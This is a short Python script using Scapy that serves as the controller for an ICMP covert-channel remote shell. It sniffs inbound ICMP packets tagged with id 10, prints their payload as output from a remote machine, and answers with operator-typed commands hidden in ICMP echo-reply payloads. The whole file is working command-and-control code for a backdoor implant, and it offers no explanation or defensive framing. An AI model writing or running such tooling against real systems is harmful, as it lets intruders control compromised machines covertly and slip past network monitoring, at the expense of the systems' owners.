from scapy.all import *
import threading


# ICMP id 10 = 0xa
def send_packet(ipsrc):
    while True:
        try:
            command = str(input("Shell> "))
            if command == "exit":
                exit()
            else:
                ip_packet = IP(dst=ipsrc) / ICMP(id=10, type=0) / Raw(load=command)
                send(ip_packet, verbose=0)
                break
        except KeyboardInterrupt:
            print("\nType 'exit' or 'quit' to leave the shell.")
        except Exception as e:
            print(f"An error occurred: {e}")


def check_packet_valid(packet):
    if packet.haslayer(ICMP) and packet[ICMP].id == 10:
        ip_src = packet[IP].src
        if packet.haslayer(Raw):
            output = packet[Raw].load.decode()
            if output == "s":
                print("")
            elif "not found" in output:
                print(output)
                send_packet(ip_src)
            else:
                print(output)
        else:
            send_packet(ip_src)


def main():

    sniff(prn=check_packet_valid, filter="inbound")


if __name__ == "__main__":
    main()
